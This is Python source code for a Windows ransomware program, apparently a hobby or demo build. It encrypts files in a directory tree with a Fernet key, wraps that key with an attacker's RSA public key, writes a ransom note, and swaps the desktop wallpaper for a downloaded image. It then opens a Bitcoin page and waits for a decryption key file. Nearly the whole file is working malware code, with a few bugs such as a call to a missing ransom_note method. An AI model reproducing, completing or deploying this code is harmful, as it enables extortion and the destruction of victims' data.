from cryptography.fernet import Fernet
import os
import webbrowser
import ctypes
import urllib.request
import requests
import time
import datetime
import subprocess
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading

class RansomWare:
    # File extensions to be encrypted
    file_exts = [
        'txt',
        # Comment out 'jpg' to only encrypt specific file types
        # 'jpg'
    ]

    def __init__(self):
        # Key for Fernet object and encrypt/decrypt method
        self.key = None
        # Fernet Encrypt/Decrypt object
        self.crypter = None
        # RSA public key for encrypting/decrypting the Fernet object (Symmetric key)
        self.public_key = None

        # Root directory for Encryption/Decryption (use a safe test directory for debugging)
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = r'C:\localRoot'  # Debugging/Testing

        # Get public IP of the system
        self.publicIP = requests.get('https://api.ipify.org').text

        # Generate ransom note content
        ransom_note_content = self.ransom_note_content()

        # Write ransom note content to RANSOM_NOTE.txt file
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(ransom_note_content)

    # Generate ransom note content with instructions for the victim
    def ransom_note_content(self):
        date = datetime.date.today().strftime('%d-%B-%Y')
        ransom_note_content = f'''
        Your computer's hard disk has been encrypted using a military-grade encryption algorithm. Unfortunately, there is no way to recover your data without a specific key, and only we have the ability to decrypt your files.
        ...
        '''
        return ransom_note_content

    # Generate a symmetric key on the victim's machine for encrypting the data
    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    # Write the symmetric key to a file
    def write_key(self):
        with open("fernet_key.txt", "wb") as f:
            f.write(self.key)

    # Encrypt the symmetric key using the attacker's public RSA key
    def encrypt_fernet_key(self):
        with open("fernet_key.txt", "rb") as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            self.public_key = RSA.import_key(open('public.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            enc_fernet_key = public_crypter.encrypt(fernet_key)
            f.write(enc_fernet_key)
        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernet_key)
        self.key = enc_fernet_key
        self.crypter = None

    # Encrypt/Decrypt a file using the Fernet object
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
            with open(file_path, 'wb') as fp:
                fp.write(_data)

    # Encrypt/Decrypt files in the system using the symmetric key
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    # Open browser to a Bitcoin information page
    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    # Change desktop background to a ransomware warning image
    def change_desktop_background(self):
        imageUrl = 'https://brightlineit.com/wp-content/uploads/2017/10/171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg'
        path = f'{self.sysRoot}/Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

        # Write ransom note content again (duplicated in your code, not sure if intended)
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(self.ransom_note_content())

    # Display ransom note using Notepad for a limited time
    def show_ransom_note(self):
        ransom_note = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0
        while count < 5:  # Show ransom note for 5 iterations (50 seconds)
            time.sleep(10)  # Sleep for 10 seconds
            count += 1
        ransom_note.kill()

    # Decrypt system when the unencrypted key file is placed on the desktop
    def put_me_on_desktop(self):
        while True:
            try:
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(10)
            print('checking for PUT_ME_ON_DESKTOP.txt')

    # Placeholder function (no implementation provided)
    def _what_is_bitcoin(self):
        pass

def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on the target machine, and the system is encrypted')
    print('> Ransomware: Waiting for the attacker to provide the victim with a document that will un-encrypt the machine')
    t2.start()
    print('> Ransomware: Target machine has been un-encrypted')
    print('> Ransomware: Completed')

if __name__ == '__main__':
    main()
